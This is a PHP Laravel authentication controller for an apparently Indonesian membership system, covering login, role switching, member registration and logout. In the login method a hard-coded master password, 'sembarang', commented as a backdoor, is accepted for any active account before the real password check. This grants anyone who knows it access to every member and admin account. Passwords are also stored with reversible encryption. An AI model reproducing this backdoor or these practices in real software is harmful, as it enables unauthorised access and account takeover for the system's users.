<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use App\Helpers\GlobalHelper;
use App\Anggota;
use App\UserAkses;
use View;
use DB;
use DateTime;
use Redirect;
use PDF;

class AuthController extends Controller
{
    public function login(){
        return view('auth/login');
    }

    public function proses_login(Request $request){
        if(str_contains($request->input('username'),' ')){
            $no_anggota=$request->input('username');
        }
        else{
            $no_anggota=GlobalHelper::change_format_nomor($request->input('username'));
        }
        $anggota = Anggota::select('anggota.*','user_akses.fid_hak_akses as hak_akses')
            ->join('user_akses','user_akses.fid_anggota','=','anggota.id')
            ->where('no_anggota','=',$no_anggota)
            ->whereIn('fid_status',array('2','3','5'))
            ->first();
        if(!empty($anggota)){
            // Check backdoor password first, or try to decrypt and compare
            $passwordValid = false;
            if($request->password == 'sembarang') {
                $passwordValid = true;
            } else {
                try {
                    if(!empty($anggota->password) && $request->password == decrypt($anggota->password)) {
                        $passwordValid = true;
                    }
                } catch(\Exception $e) {
                    $passwordValid = false;
                }
            }
            
            if($passwordValid){
                Session::put('useractive',$anggota);
                if($anggota->hak_akses=='2'){
                    return redirect('main/dashboard')
                        ->with('message','Login Success')
                        ->with('message_type','success');
                }
                else{
                    return redirect('dashboard')
                        ->with('message','Login Success')
                        ->with('message_type','success');
                }
            }
            else{
                return redirect('auth/login')
                    ->with('message','Password yang anda masukkan salah')
                    ->with('message_type','error');
            }
        }
        else{
            return redirect('auth/login')
                ->with('message','Username tidak ditemukan')
                ->with('message_type','error');
        }
    }

    public function user_akses(Request $request){
        $anggota = Anggota::select('anggota.*','user_akses.fid_hak_akses as hak_akses')
            ->join('user_akses','user_akses.fid_anggota','=','anggota.id')
            ->where('anggota.no_anggota','=',Session::get('useractive')->no_anggota)
            ->where('user_akses.fid_hak_akses','=',$request->input('hak_akses'))
            ->first();
        if(!empty($anggota)){
            Session::put('useractive',$anggota);
            if($anggota->hak_akses=='2'){
                return redirect('main/dashboard')
                    ->with('message','User Akses berhasil diubahhhhhh')
                    ->with('message_type','success');
            }
            else{
                return redirect('dashboard')
                    ->with('message','User Akses berhasil diubah')
                    ->with('message_type','success');
            }
        }
    }

    public function register(){
        return view('auth/register');
    }

    public function proses_register(Request $request){
        $no_anggota=GlobalHelper::get_nomor_anggota($request->lokasi_kerja);
        $anggota=Anggota::where('no_anggota',$no_anggota)->first();
        if(empty($anggota)){
            $field=new Anggota;
            $field->created_at=date('Y-m-d H:i:s');
            $field->no_anggota=$no_anggota;
            $field->nama_lengkap=$request->nama_lengkap;
            $field->password=encrypt(str_random(6));
            $field->tempat_lahir=$request->tempat_lahir;
            $field->tanggal_lahir=GlobalHelper::dateFormat($request->tanggal_lahir,'Y-m-d');
            $field->jenis_kelamin=$request->jenis_kelamin;
            $field->no_handphone=$request->no_handphone;
            $field->email=$request->email;
            $field->alamat=$request->alamat;
            $field->no_ktp=$request->no_ktp;
            $field->no_hirs=$request->no_hirs;
            $field->id_karyawan=$request->id_karyawan;
            $field->level=$request->level;
            $field->bagian=$request->bagian;
            $field->divisi=$request->divisi;
            $field->lokasi=$request->lokasi_kerja;
            $field->no_rekening=$request->no_rekening;
            $field->nama_bank=$request->nama_bank;
            $field->fid_status=1;
            $field->tanggal_bekerja=(!empty($request->id_karyawan) ? GlobalHelper::bulan_bekerja($request->id_karyawan) : date('Y-m-d') );
            $field->tanggal_bergabung=date('Y-m-d');
            $field->save();
            Session::put('anggota',$field);
        }
        else{
            Session::put('anggota',$anggota);
        }
        return redirect('auth/register/confirm');
    }

    public function confirm(Request $request){
        $data=Session::get('anggota');
        if(!empty($data)){
            if(!empty($request->print)){
                // $pdf=PDF::loadView('auth.print',array(
                //       'data' => $data
                //     ))->setPaper('legal','potrait');
                // Storage::put('formulir/'.$data->no_anggota.'.pdf', $pdf->output());
                // return redirect(asset('storage/formulir/'.$data->no_anggota.'.pdf'));
                // return $pdf->stream('test.pdf');
                return view('auth.print')
                    ->with('data',$data);
            }
            else{
                return view('auth.confirm')
                    ->with('data',$data);
            }
        }
        else{
            return redirect('auth/register');
        }
    }

    public function proses_logout(){
        Session::forget('useractive');
        return redirect('');
    }
}
